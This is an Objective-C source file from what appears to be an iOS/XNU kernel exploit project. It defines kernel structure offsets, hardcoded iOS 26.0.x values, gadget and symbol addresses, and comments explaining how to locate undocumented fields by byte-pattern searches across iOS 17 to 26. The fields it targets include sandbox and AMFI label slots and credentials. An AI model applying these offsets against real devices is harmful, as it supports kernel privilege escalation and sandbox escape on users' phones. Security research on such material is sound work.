//
//  offsets.m
//  darksword-kexploit-fun
//
//  Created by seo on 3/24/26.
//

#include "offsets.h"
#include <stdint.h>
#include <sys/sysctl.h>

extern uint64_t gKernelBase, gKernelSlide;

// You can obtain offsets from macOS KDK that matching xnu version; always not same with iOS, but almost similar.
uint32_t off_inpcb_inp_list_le_next = 0;                        // (lldb) p/x offsetof(inpcb, inp_list.le_next)
uint32_t off_inpcb_inp_list_le_prev = 0;                        // (lldb) p/x offsetof(inpcb, inp_list.le_prev)
uint32_t off_inpcb_inp_pcbinfo = 0;                             // (lldb) p/x offsetof(inpcb, inp_pcbinfo)
uint32_t off_inpcb_inp_socket = 0;                              // (lldb) p/x offsetof(inpcb, inp_socket)
uint32_t off_inpcb_inp_depend6_inp6_icmp6filt = 0;              // (lldb) p/x offsetof(inpcb, inp_depend6.inp6_icmp6filt)
uint32_t off_inpcb_inp_depend6_inp6_chksum = 0;                 // (lldb) p/x offsetof(inpcb, inp_depend6.inp6_cksum)
uint32_t off_inpcbinfo_ipi_zone = 0;                            // (lldb) p/x offsetof(inpcbinfo, ipi_zone)
uint32_t off_socket_so_usecount = 0;                            // (lldb) p/x offsetof(socket, so_usecount)
uint32_t off_socket_so_proto = 0;                               // (lldb) p/x offsetof(socket, so_proto)
uint32_t off_socket_so_background_thread = 0;                   // (lldb) p/x offsetof(socket, so_background_thread)
uint32_t off_kalloc_type_view_kt_zv_zv_name = 0;                // (lldb) p/x offsetof(kalloc_type_view, kt_zv.zv_name)
// NOT POSSIBLE TO find offset from KDK.  (lldb) p/x offsetof(thread, t_tro)
// iOS 17.x, 18.x, 26.x: find hex E1 00 00 54 28 00 40 F9 1F 01 00 EB C1 00 00 54, and get it from prologue+0xc or +0x10;
uint32_t off_thread_t_tro = 0;
uint32_t off_thread_ro_tro_proc = 0;                            // (lldb) p/x offsetof(thread_ro, tro_proc)
uint32_t off_thread_ro_tro_task = 0;                            // (lldb) p/x offsetof(thread_ro, tro_task)
// NOT POSSIBLE TO find offset from KDK. (lldb) p/x offsetof(thread, machine.upcb)
// iOS 17.x, 18.x: find hex 88 42 40 B9 08 69 1B 12, xref search to identify the function that references it TWICE. Then, determine offset at prologue + 0x24 of that specific function.
// iOS 26.x: find hex 88 42 40 B9 08 69 1B 12, xref search to identify the function that references it TWICE. Then, determine offset at prologue + 0x1c or +0x24 of that specific function.
uint32_t off_thread_machine_upcb = 0;
uint32_t off_thread_machine_contextdata = 0;                    // just substract 8 from off_thread_machine_upcb.   (lldb) p/x offsetof(thread, machine.contextData)
// NOT POSSIBLE TO find offset from KDK. (lldb) p/x offsetof(thread, ctid)
// iOS 17.x: find hex F4 03 00 AA 1A 7F 40 93, and get it from prologue+0x6c;
// iOS 18.0+: find hex F4 03 00 AA 19 3D 00 12, and get it from prologue+0x6c(LDR);
// iOS 18.4 - 26.x: find hex ?? ?? FF B5 ?? ?? ?? ?? ?? ?? ?? ?? 02 00 80 52 03 00 80 52 04 00 80 12, and get it from prologue+0x64(LDR);
uint32_t off_thread_ctid = 0;
// NOT POSSIBLE TO find offset from KDK. (lldb) p/x offsetof(thread, options)
// iOS 17.x - 18.3: find hex 08 7D 14 9B 09 FD 42 D3, and get if from prologue+0x20(LDRH);
// iOS 18.4 - 26.x: find hex E0 03 13 AA 02 00 F0 92 03 00 80 52, and get if from prologue+0x20(LDRH);
uint32_t off_thread_options = 0;
// NOT POSSIBLE TO find offset from KDK. (lldb) p/x offsetof(thread, mutex.lck_mtx.data)
// iOS 17.x, 18.x, 26.x: xref str "called exception_triage when it was forbidden by the boot environment @%s:%d", get value from prologue+0x44 or +0x40(ADD), and finally calculate by adding 8.
uint32_t off_thread_mutex_lck_mtx_data = 0;
// NOT POSSIBLE TO find offset from KDK. (lldb) p/x offsetof(thread, machine.kstackptr)
// iOS 17.x, 18.x: find hex 60 01 80 52 02 00 80 52, and get it from prologue+0x80, +0x84 or +0x8c(second STR);
// iOS 26.x: find hex 60 01 80 52 02 00 80 52, and get it from prologue+0x8c or +0x84(second STR);
uint32_t off_thread_machine_kstackptr = 0;
// NOT POSSIBLE TO find offset from KDK. (lldb) p/x offsetof(thread, machine.jop_pid)
// iOS 17.x, 18.x, 26.x: find matched instr via search hex 3F 01 00 71 E8 03 88 9A ?? ?? ?? B9, find bl func from matched instr, and get it from bl func (`machine_thread_siguctx_pointer_convert_to_user`) prologue+0x38 or +0x3c(LDR); (lldb) p/x offsetof(thread, machine.rop_pid)
uint32_t off_thread_machine_jop_pid = 0;
uint32_t off_thread_machine_rop_pid = 0;    // substract 8 from off_thread_machine_jop_pid; (lldb) p/x offsetof(thread, machine.jop_pid)
// NOT POSSIBLE TO find offset from KDK. (lldb) p/x offsetof(thread, guard_exc_info.code)
// iOS 17.x-18.3.x: find str "guard_exc_info %llx %llx @%s:%d", and get it from prologue+0x10(first LDR);
// iOS 18.4+: no more exist, renamed to mach_exc_info.code
uint32_t off_thread_guard_exc_info_code = 0;
// NOT POSSIBLE TO find offset from KDK. (lldb) p/x offsetof(thread, mach_exc_info.code)
// iOS 26.x: find str "guard_exc_info %llx %llx @%s:%d", and get it from prologue+0x28; (3rd LDR)
uint32_t off_thread_mach_exc_info_code = 0;
uint32_t off_thread_mach_exc_info_os_reason = 0;    //substract 8 from off_thread_mach_exc_info_code. (lldb) p/x offsetof(thread, mach_exc_info.os_reason)
uint32_t off_thread_mach_exc_info_exception_type = 0;  //substract 4 from off_thread_mach_exc_info_code. (lldb) p/x offsetof(thread, mach_exc_info.exception_type)
// NOT POSSIBLE TO find offset from KDK. (lldb) p/x offsetof(thread, ast)
// iOS 17.x: find hex E9 07 9F 1A 08 79 1C 12 08 0D 09 2A, and get it from prologue+0x80 (ADD instr);
// iOS 18.0+: find hex E9 07 9F 1A 08 79 1C 12 08 0D 09 2A, and get it from prologue+0x90 (ADD instr);
// iOS 18.4+: find hex 09 80 C0 D2 09 00 E4 F2 01 01 09 AA E0 03 13 AA, get func by instr+0x14, and and get it from func prologue+0xa0(ADD instr) or 0xac(LDR instr);
// iOS 26.x: find hex 09 01 80 52 9F 02 00 71, and get it from prologue+0xa0(ADD instr) or 0xac(LDR instr);
uint32_t off_thread_ast = 0;
// NOT POSSIBLE TO find offset from KDK. (lldb) p/x offsetof(thread, task_threads.next)
// iOS 17.x: find hex 1F 01 09 EB 81 FF FF 54, and get it from prologue+0x5c;
// iOS 18.0+: find hex E2 03 08 AA 3F FD A2 88 B6 00 80 52 5F 00 08 6B, and get it from prologue+0x5c(LDR);
// iOS 18.4+: find hex E2 03 08 AA BF FE A2 88 B4 00 80 52, and get it from prologue+0x58;
// iOS 26.x: find hex E2 03 08 AA BF FE A2 88 B4 00 80 52, and get it from prologue+0x58;
uint32_t off_thread_task_threads_next = 0;
uint32_t off_proc_p_list_le_next = 0;                           // (lldb) p/x offsetof(proc, p_list.le_next)
uint32_t off_proc_p_list_le_prev = 0;                           // (lldb) p/x offsetof(proc, p_list.le_prev)
uint32_t off_proc_p_proc_ro = 0;                                // (lldb) p/x offsetof(proc, p_proc_ro)
uint32_t off_proc_p_pid = 0;                                    // (lldb) p/x offsetof(proc, p_pid)
// NOT POSSIBLE TO find offset from KDK. (lldb) p/x offsetof(proc, p_fd)
// iOS 17.x: find hex 8A 5A 01 B9 29 05 64 B2 EA 02 05 91 49 7D E8 C8, and get it from prologue+0x50(ADD);
// iOS 18.x: find hex ED 13 04 32 8C 01 0D 0B 9F 01 09 6B A3 14 00 54, and get it from prologue+0x50(ADD);
// iOS 26.x: find hex ?? ?? FF 34 E9 03 0A AA 4B 05 00 11 0B 7C AA 88 5F 01 09 6B, and get it from prologue+0x48;
uint32_t off_proc_p_fd = 0;
// NOT POSSIBLE to find offset from KDK. (lldb) p/x offsetof(proc, p_flag)
// iOS 17.x, 18.x: find hex 09 00 B0 52 08 11 29 B8 E0, and get it from prologue+0x60(LDR);
// iOS 26.x: find hex E8 03 00 AA E0 03 13 AA 88 00 00 34 ?? ?? ?? 94, and get it from prologue+0x7c or +0x78 (LDR, right before LSR)
uint32_t off_proc_p_flag = 0;
// NOT POSSIBLE TO find offset from KDK. (lldb) p/x offsetof(proc, p_textvp)
// iOS 17.x, 18.x, 26.x: xref str "exec_resettextvp: expected valid vp @%s:%d", and get it from prologue+0x28 (first LDR);
uint32_t off_proc_p_textvp = 0;
// NOT POSSIBLE TO find offset from KDK. (lldb) p/x offsetof(proc, p_name)
// iOS 17.x, 18.x, 26.x: xref str "initproc", and then get it from instr-0x4
uint32_t off_proc_p_name = 0;
uint32_t off_proc_ro_pr_task = 0;                               // (lldb) p/x offsetof(proc_ro, pr_task)
uint32_t off_proc_ro_p_ucred = 0;                               // (lldb) p/x offsetof(proc_ro, p_ucred), newly changed in iOS 18.4+
uint32_t off_ucred_cr_label = 0;                                // (lldb) p/x offsetof(ucred, cr_label)
// NOT POSSIBLE to find offset from KDK, since iOS 18+. (lldb) p/x offsetof(task, itk_space)
// iOS 17.x, 18.x, 26.x: find hex 68 1A 40 B9 08 41 00 51 1F 15 00 71, and get it from prologue+0x4c or + 0x50(LDR)
uint32_t off_task_itk_space = 0;
uint32_t off_task_threads_next = 0;                             // (lldb) p/x offsetof(task, threads.next)
// NOT POSSIBLE TO find offset from KDK. (lldb) p/x offsetof(task, task_exc_guard)
// iOS 17.x, 18.x, 26.x: find hex BF 06 02 71 E3 27 9F 1A, and get it from prologue+0x34(LDRB);
uint32_t off_task_task_exc_guard = 0;
uint32_t off_task_map = 0;                                      // (lldb) p/x offsetof(task, map)
uint32_t off_filedesc_fd_ofiles = 0;                            // (lldb) p/x offsetof(filedesc, fd_ofiles)
uint32_t off_filedesc_fd_cdir = 0;                              // (lldb) p/x offsetof(filedesc, fd_cdir)
uint32_t off_fileproc_fp_glob = 0;                              // (lldb) p/x offsetof(fileproc, fp_glob)
uint32_t off_fileglob_fg_data = 0;                              // (lldb) p/x offsetof(fileglob, fg_data)
uint32_t off_fileglob_fg_flag = 0;                              // (lldb) p/x offsetof(fileglob, fg_flag)
uint32_t off_vnode_v_ncchildren_tqh_first = 0;                  // (lldb) p/x offsetof(vnode, v_ncchildren.tqh_first)
uint32_t off_vnode_v_nclinks_lh_first = 0;                      // (lldb) p/x offsetof(vnode, v_nclinks.lh_first)
uint32_t off_vnode_v_parent = 0;                                // (lldb) p/x offsetof(vnode, v_parent)
uint32_t off_vnode_v_data = 0;                                  // (lldb) p/x offsetof(vnode, v_data)
uint32_t off_vnode_v_name = 0;                                  // (lldb) p/x offsetof(vnode, v_name)
uint32_t off_vnode_v_usecount = 0;                              // (lldb) p/x offsetof(vnode, v_usecount)
uint32_t off_vnode_v_iocount = 0;                               // (lldb) p/x offsetof(vnode, v_iocount)
uint32_t off_vnode_v_writecount = 0;                            // (lldb) p/x offsetof(vnode, v_writecount)
uint32_t off_vnode_v_flag = 0;                                  // (lldb) p/x offsetof(vnode, v_flag)
uint32_t off_vnode_v_mount = 0;                                 // (lldb) p/x offsetof(vnode, v_mount)
uint32_t off_mount_mnt_flag = 0;                                // (lldb) p/x offsetof(mount, mnt_flag)
uint32_t off_namecache_nc_vp = 0;                               // (lldb) p/x offsetof(namecache, nc_vp)
uint32_t off_namecache_nc_child_tqe_next = 0;                   // (lldb) p/x offsetof(namecache, nc_child.tqe_next)
uint32_t off_arm_saved_state64_lr = 0;                          // (lldb) p/x offsetof(arm_saved_state64, lr)
uint32_t off_arm_saved_state64_pc = 0;                          // (lldb) p/x offsetof(arm_saved_state64, pc)
uint32_t off_arm_saved_state_uss_ss_64 = 0;                     // (lldb) p/x offsetof(arm_saved_state, uss.ss_64)
uint32_t off_ipc_space_is_table = 0;                            // (lldb) p/x offsetof(ipc_space, is_table)
uint32_t off_ipc_entry_ie_object = 0;                           // (lldb) p/x offsetof(ipc_entry, ie_object)
uint32_t off_ipc_port_ip_kobject = 0;                           // (lldb) p/x offsetof(ipc_port, ip_kobject)
uint32_t off_arm_kernel_saved_state_sp = 0;                     // (lldb) p/x offsetof(arm_kernel_saved_state, sp)
uint32_t off_vm_map_hdr = 0;                                    // (lldb) p/x offsetof(_vm_map, hdr)
uint32_t off_vm_map_header_nentries = 0;                        // (lldb) p/x offsetof(vm_map_header, nentries)
uint32_t off_vm_map_entry_links_next = 0;                       // (lldb) p/x offsetof(vm_map_entry, links.next)
uint32_t off_vm_map_entry_vme_object_or_delta = 0;              // (lldb) p/x offsetof(vm_map_entry, vme_object_or_delta)
uint32_t off_vm_map_entry_vme_alias = 0;                        // (lldb) p/x offsetof(vm_map_entry, vme_alias)
uint32_t off_vm_map_header_links_next = 0;                      // (lldb) p/x offsetof(vm_map_header, links.next)
uint32_t off_vm_object_vo_un1_vou_size = 0;                     // (lldb) p/x offsetof(vm_object, vo_un1.vou_size)
uint32_t off_vm_object_ref_count = 0;                           // (lldb) p/x offsetof(vm_object, ref_count)
uint32_t off_vm_named_entry_backing_copy = 0;                   // (lldb) p/x offsetof(vm_named_entry, backing.copy)
uint32_t off_vm_named_entry_size = 0;                           // (lldb) p/x offsetof(vm_named_entry, size)
uint32_t off_label_l_perpolicy_amfi = 0;                        // based on __Z14amfi_cslot_getP5label(_amfi_mac_slot) from kernel_ipadm3_183; (lldb) p/x offsetof(label, l_perpolicy[0])
uint32_t off_label_l_perpolicy_sandbox = 0;                     // based on _label_get_sandbox(_label_slot_0) from kernel_ipadm3_183; (lldb) p/x offsetof(label, l_perpolicy[1])
uint32_t off_fg_data = 0;                                       // (lldb) p/x offsetof(fileglob, fg_data)
uint32_t off_socket_so_pcb = 0;

uint32_t sizeof_ipc_entry = 0;                                  // (lldb) p/x sizeof(ipc_entry)

uint64_t *symbols = NULL;

// /Library/Developer/KDKs/KDK_26.0_25A353.kdk/System/Library/Kernels/kernel.release.vmapple
uint64_t ksymbols_avm1_25a354[] = {
    (0xFFFFFE00072875F8 + 0x638000),   // KSYMBOL_KERNPROC
    (0xFFFFFE00072EA5F0 + 0xb90000),   // KSYMBOL_IPC_ENTRY_LOOKUP
    (0xFFFFFE00074C99D4 + 0xb90000),   // KSYMBOL_STR_X1_X0_RET
    (0xFFFFFE0007BF9D48 + 0xb90000),   // KSYMBOL_STR_W1_X0_RET
    (0xFFFFFE000732EA34 + 0xb90000),   // KSYMBOL_KALLOC_EXTERNAL
};

uint64_t ksym(enum ksymbol sym)
{
    return symbols[sym] + gKernelSlide;
};

void offsets_init(void) {
    // iOS 26.0.x
    off_inpcb_inp_list_le_next = 0x20; 
    off_inpcb_inp_list_le_prev = 0x28;
    off_inpcb_inp_pcbinfo = 0x38;   
    off_inpcb_inp_socket = 0x40;    
    off_inpcb_inp_depend6_inp6_icmp6filt = 0x148;
    off_inpcb_inp_depend6_inp6_chksum = 0x150;
    off_inpcbinfo_ipi_zone = 0x68;  
    off_socket_so_usecount = 0x23c;
    off_socket_so_proto = 0x20;
    off_socket_so_background_thread = 0x298;
    off_kalloc_type_view_kt_zv_zv_name = 0x10;  
    off_thread_ro_tro_proc = 0x18;  
    off_thread_ro_tro_task = 0x28;  
    off_thread_machine_upcb = 0xb8; //different PER DEVICES; A12+, A17+&M3+
    off_thread_machine_contextdata = 0xb8-8;    //different PER DEVICES; A12+, A17+&M3+
    off_thread_t_tro = 0x390;   //different PER DEVICES; A12, A13+, A15+, A17&M3, A18&M4
    off_thread_ctid = 0x430;    //different PER DEVICES; A12, A13+, A15+, A17&M3, A18&M4
    off_thread_options = 0x70;  //different PER DEVICES; A12+, A17+&M3+
    off_thread_mutex_lck_mtx_data = 0x3A8+8;    //different PER DEVICES; A12, A13+, A15+, A17+&M3, A18&M4
    off_thread_machine_kstackptr = 0xf0;    //different PER DEVICES; A12, A13+, A17+&M3+
    off_thread_machine_jop_pid = 0x160;     //different PER DEVICES; A12, A13+, A15+, A17+
    off_thread_machine_rop_pid = 0x160-8;   //different PER DEVICES; A12, A13+, A15+, A17+
    off_thread_guard_exc_info_code = 0xdeaddead; //has been renamed to off_thread_mach_exc_info_code
    off_thread_mach_exc_info_code = 0x330;  //different PER DEVICES; A12, A13+, A15+, A17&M3, A18&M4
    off_thread_mach_exc_info_os_reason = 0x330-8;   //different PER DEVICES; A12, A13+, A15+, A17&M3, A18&M4
    off_thread_mach_exc_info_exception_type = 0x330-4;  //different PER DEVICES; A12, A13+, A15+, A17&M3, A18&M4
    off_thread_ast = 0x3A4; //different PER DEVICES; A12, A13+, A15+, A17&M3, A18&M4
    off_thread_task_threads_next = 0x370;   //different PER DEVICES; A12, A13+, A15+, A17/M3, A18&M4
    off_proc_p_list_le_next = 0x0;  
    off_proc_p_list_le_prev = 0x8;  
    off_proc_p_proc_ro = 0x18;  
    off_proc_p_pid = 0x60;  
    off_proc_p_fd = 0xd0;   
    off_proc_p_flag = 0x454;    
    off_proc_p_textvp = 0x548;  
    off_proc_p_name = 0x57D;    
    off_proc_ro_pr_task = 0x8;
    off_proc_ro_p_ucred = 0x28;
    off_ucred_cr_label = 0x78;
    off_task_itk_space = 0x318;     
    off_task_threads_next = 0x50;
    off_task_task_exc_guard = 0x5d4;    //different PER DEVICES; A12+, A15+&M3, A18&M4
    off_task_map = 0x28;    
    off_filedesc_fd_ofiles = 0x28;  
    off_filedesc_fd_cdir = 0x48;    
    off_fileproc_fp_glob = 0x10;    
    off_fileglob_fg_data = 0x38;    
    off_fileglob_fg_flag = 0x10;    
    off_vnode_v_ncchildren_tqh_first = 0x30;    
    off_vnode_v_nclinks_lh_first = 0x40;    
    off_vnode_v_parent = 0xc0;  
    off_vnode_v_data = 0xe0;    
    off_vnode_v_name = 0xb8;    
    off_vnode_v_usecount = 0x60;    
    off_vnode_v_iocount = 0x64;     
    off_vnode_v_writecount = 0xb0;  
    off_vnode_v_flag = 0x54;    
    off_vnode_v_mount = 0xd8;   
    off_mount_mnt_flag = 0x70;  
    off_namecache_nc_vp = 0x50; 
    off_namecache_nc_child_tqe_next = 0x10; 
    off_arm_saved_state64_lr = 0xf0;    
    off_arm_saved_state64_pc = 0x100;   
    off_arm_saved_state_uss_ss_64 = 0x8;    
    off_ipc_space_is_table = 0x48;  
    off_ipc_entry_ie_object = 0;    
    off_ipc_port_ip_kobject = 0x50; 
    off_arm_kernel_saved_state_sp = 0x60;   
    off_vm_map_hdr = 0x10;  
    off_vm_map_header_nentries = 0x20;  
    off_vm_map_entry_links_next = 0x8;  
    off_vm_map_entry_vme_object_or_delta = 0x3c;    
    off_vm_map_entry_vme_alias = 0x40;  
    off_vm_map_header_links_next = 0x8; 
    off_vm_object_vo_un1_vou_size = 0x18;   
    off_vm_object_ref_count = 0x28; 
    off_vm_named_entry_backing_copy = 0x10; 
    off_vm_named_entry_size = 0x20;
    off_label_l_perpolicy_amfi = 0x8;
    off_label_l_perpolicy_sandbox = 0x10;
    off_fg_data = 0x38;
    off_socket_so_pcb = 0x18;

    sizeof_ipc_entry = 0x18;

    symbols = ksymbols_avm1_25a354;
}